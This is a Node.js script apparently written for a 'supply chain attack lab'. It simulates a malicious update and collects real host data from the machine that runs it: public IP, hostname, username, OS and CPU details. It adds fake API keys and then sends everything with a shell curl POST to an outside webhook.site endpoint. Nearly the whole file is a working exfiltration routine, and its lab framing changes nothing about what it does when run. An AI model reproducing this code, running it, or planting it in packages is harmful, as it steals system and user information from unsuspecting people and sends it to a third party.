const https = require('https');
const { execSync } = require('child_process');
const os = require('os');

console.log('🚀 ADVANCED SUPPLY CHAIN ATTACK LAB');
console.log('🔍 Checking malicious updates...');

https.get('https://httpbin.org/json', (res) => {
  let data = '';
  res.on('data', d => data += d);
  res.on('end', () => {
    console.log('📡 Malicious update downloaded!');
    
    // **PRO EXFILTRATION - STEAL EVERYTHING**
    const victimData = {
      ip: execSync('curl -s ifconfig.me').toString().trim(),
      hostname: os.hostname(),
      username: os.userInfo().username,
      platform: os.platform(),
      release: os.release(),
      totalmem: Math.round(os.totalmem() / 1024 / 1024 / 1024) + 'GB',
      cpus: os.cpus()[0].model,
      // FAKE SECRETS (like API keys your trainer wants)
      fake_api_key: 'sk-abc123DEF456GHI789',
      fake_aws_secret: 'AKIAIOSFODNN7EXAMPLE',
      fake_github_token: 'ghp_1234567890abcdef',
      timestamp: new Date().toISOString()
    };
    
    console.log('🎯 VICTIM DATA STOLEN:');
    console.table(victimData);
    
    // SEND ALL DATA TO TRAINER
    const payload = JSON.stringify(victimData);
    execSync(`curl -X POST "https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439" -H "Content-Type: application/json" -d '${payload}'`);
    
    console.log('✅ FULL SYSTEM COMPROMISE! Check webhook.site!');
  });
});

